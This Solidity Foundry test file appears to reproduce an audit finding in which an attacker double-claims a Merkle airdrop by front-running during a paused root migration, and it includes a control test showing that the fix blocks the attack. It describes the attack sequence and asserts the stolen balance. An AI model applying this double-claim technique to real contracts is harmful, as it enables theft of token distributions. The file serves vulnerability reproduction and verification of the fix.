// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {
    Exploit,
    KarmaAirdrop,
    KarmaAirdropFixed,
    MiniToken
} from "./65323-user-can-double-claim-airdrop-cyfrin-none-statusl-markdown.sol";

contract KarmaAirdropDoubleClaimTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant DELEGATEE = address(uint160(0xDE1E));
    address internal constant NEWCOMER = address(uint160(0xBEE));

    uint256 internal constant INDEX = 0;
    uint256 internal constant ALLOCATION = 1000 ether;

    function _leaf(uint256 index, address account, uint256 amount) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(index, account, amount));
    }

    function _hashPair(bytes32 a, bytes32 b) internal pure returns (bytes32) {
        return a < b ? keccak256(abi.encodePacked(a, b)) : keccak256(abi.encodePacked(b, a));
    }

    // ── Vulnerable path: attacker double-claims 2x their single allocation ──
    function test_exploit_doubleClaimAcrossMerkleRootMigration() public {
        Exploit e = new Exploit();
        e.run();

        // Both claims delivered the full allocation.
        assertEq(e.firstClaim(), ALLOCATION, "first (paused-window) claim");
        assertEq(e.secondClaim(), ALLOCATION, "second (post-migration) claim");

        // HARM: attacker holds 2x their single 1000-token allocation — the second
        // copy is stolen because the epoch reset re-opened their claim.
        assertEq(e.allocation(), ALLOCATION, "allocation baseline");
        assertEq(e.attackerBalance(), 2 * ALLOCATION, "attacker double-claimed");

        // Real tokens truly moved to the attacker EOA.
        MiniToken token = MiniToken(e.tokenAddr());
        assertEq(token.balanceOf(ATTACKER), 2 * ALLOCATION, "stolen tokens at attacker EOA");
    }

    // ── Negative control: the verified fix (whenNotPaused) blocks the double ──
    // Identical scenario against KarmaAirdropFixed: the paused-window front-run
    // reverts, so the attacker can only claim once (1x allocation).
    function test_control_fixedContract_blocksDoubleClaim() public {
        MiniToken token = new MiniToken("Airdrop Token", "AIRDROP");
        KarmaAirdropFixed airdrop = new KarmaAirdropFixed(address(token), address(this), true, DELEGATEE);
        token.mint(address(airdrop), 10 * ALLOCATION);

        bytes32 aLeaf = _leaf(INDEX, ATTACKER, ALLOCATION);
        airdrop.setMerkleRoot(aLeaf); // epoch 0

        bytes32[] memory emptyProof = new bytes32[](0);

        // Owner pauses to migrate.
        airdrop.pause();

        // FIX: the paused-window front-running claim now reverts (Pausable: paused).
        vm.expectRevert(abi.encodeWithSignature("Error(string)", "Pausable: paused"));
        airdrop.claim(INDEX, ATTACKER, ALLOCATION, emptyProof, 0, 0, 0, bytes32(0), bytes32(0));

        // Owner commits root2 (attacker still re-listed) and unpauses.
        bytes32 bLeaf = _leaf(1, NEWCOMER, ALLOCATION);
        bytes32 root2 = _hashPair(aLeaf, bLeaf);
        airdrop.setMerkleRoot(root2); // epoch 0 -> 1
        airdrop.unpause();

        // Attacker can now claim exactly ONCE under root2.
        bytes32[] memory proof2 = new bytes32[](1);
        proof2[0] = bLeaf;
        airdrop.claim(INDEX, ATTACKER, ALLOCATION, proof2, 0, 0, 0, bytes32(0), bytes32(0));

        // A second claim under the same (epoch 1) root now reverts as AlreadyClaimed.
        vm.expectRevert(KarmaAirdropFixed.KarmaAirdrop__AlreadyClaimed.selector);
        airdrop.claim(INDEX, ATTACKER, ALLOCATION, proof2, 0, 0, 0, bytes32(0), bytes32(0));

        // Attacker ends with a SINGLE allocation — no theft.
        assertEq(token.balanceOf(ATTACKER), ALLOCATION, "fixed: attacker receives exactly one allocation");
    }
}
